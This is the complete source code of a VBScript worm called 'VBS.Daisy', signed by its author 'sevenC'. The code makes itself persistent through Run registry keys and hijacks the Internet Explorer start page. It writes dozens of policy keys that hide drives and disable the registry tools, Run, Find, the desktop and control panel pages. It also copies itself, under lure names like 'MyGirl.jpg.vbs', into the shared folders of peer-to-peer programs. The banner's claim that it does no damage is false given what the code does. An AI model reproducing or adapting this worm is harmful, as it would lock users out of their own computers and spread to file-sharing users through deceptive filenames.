'VBS.Daisy__By sevenC___________________________________________________
'   _______   _______   _       _   _______       ____   ____  _______
'  / ____ \\ / ____ \\ /\\     /\\ / ____ \\     /   \\ /  // / ____ \\
' / //___\// \ \\_ \// \ \\   / // \ \\_ \//    /  /\ \/  // / //   \//
' \______ \\ / __//     \ \\ / //  / __//      /  // \   //  \ \\   _
' /\\___/ // \ \\__/\\   \ \/ //   \ \\__/\\  /  //  /  //    \ \\__/\\
' \______//   \_____//    \__//     \_____// /__//  /__//      \_____//
'________________________http://trax.to/sevenC__________________________
'________________________sevenC_zone@yahoo.com__________________________
'No Infecting,No deleting,No destroying
'Peer to peer Spreading
'_______________________________________________________________________

On Error Resume Next
Dim daisy, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set daisy = wscript.CreateObject("WScript.Shell")
Set Fso = CreateObject("scripting.FileSystemObject")
daisy.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
daisy.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "sevenc.vze.com"
daisy.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page", "sectors.vze.com"
daisy.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
daisy.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "sevenC"
daisy.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shell32", "C:\Windows\Shell32.vbs"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDiskCpl", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolder", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispAppearancePage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispBackgroundPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispScrSavPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispSettingsPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetup", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetupIDPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoFileSharingControl", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetupSecurityPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoSecCpl", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoAdminPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoProfilePage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoPwdPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoAddPrinter", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDeletePrinter", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPrinterTabs", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDevMgrPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoFileSysPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoVirtMemPage", 1, "REG_DWORD"
daisy.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSettings", 1, "REG_DWORD"
Fso.copyfile wscript.scriptfullname, "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
Fso.copyfile wscript.scriptfullname, "C:\windows\Shell32.vbs"
MyWorm = (WScript.ScriptFullName)
KMD = ("C:\Program Files\KMD\My Shared Folder")& "\"
Kazaa = ("C:\Program Files\Kazaa\My Shared Folder") & "\"
KazaaLiteL = ("C:\Program Files\KaZaA Lite\My Shared Folder") & "\"
Morpheus = ("C:\Program Files\Morpheus\My Shared Folder") & "\"
Grokster = ("C:\Program Files\Grokster\My Grokster") & "\"
BearShare = ("C:\Program Files\BearShare\Shared") & "\"
Edonkey = ("C:\Program Files\Edonkey2000\Incoming") & "\"
if fso.folderexists(KMD) then
fso.copyfile MyWorm, KMD & "MyGirl.jpg.vbs"
fso.copyfile MyWorm, KMD & "Daisy.exe.vbs"
fso.copyfile MyWorm, KMD & "Too-phat.mp3.vbs"
end if
if fso.folderexists(Kazaa) then
fso.copyfile MyWorm, Kazaa & "MyGirl.jpg.vbs"
fso.copyfile MyWorm, Kazaa & "Daisy.exe.vbs"
fso.copyfile MyWorm, Kazaa & "Too-phat.mp3.vbs"
end if
if fso.folderexists(KazaaLite) then
fso.copyfile MyWorm, KazaaLite & "MyGirl.jpg.vbs"
fso.copyfile MyWorm, KazaaLite & "Daisy.exe.vbs"
fso.copyfile MyWorm, KazaaLite & "Slipknot.mp3.vbs"
end if
if fso.folderexists(Morpheus) then
fso.copyfile MyWorm, Morpheus & "Sex.jpg.vbs"
fso.copyfile MyWorm, Morpheus & "Games.exe.vbs"
fso.copyfile MyWorm, Morpheus & "Too-phat.mp3.vbs"
end if
if fso.folderexists(Grokster) then
fso.copyfile MyWorm, Grokster & "vagina.jpg.vbs"
fso.copyfile MyWorm, Grokster & "Cool-Games.exe.vbs"
fso.copyfile MyWorm, Grokster & "Friday-I'm-in-love.mp3.vbs"
end if
if fso.folderexists(BearShare) then
fso.copyfile MyWorm, BearShare & "Freesex.jpg.vbs"
fso.copyfile MyWorm, BearShare & "Motor-games.exe.vbs"
fso.copyfile MyWorm, BearShare & "House-of-Pain.mp3.vbs"
end if
if fso.folderexists(Edonkey) then
fso.copyfile MyWorm, Edonkey & "Porn_girl.jpg.vbs"
fso.copyfile MyWorm, Edonkey & "Love.exe.vbs"
fso.copyfile MyWorm, Edonkey & "Daisy_my_honey.mp3.vbs"
end if
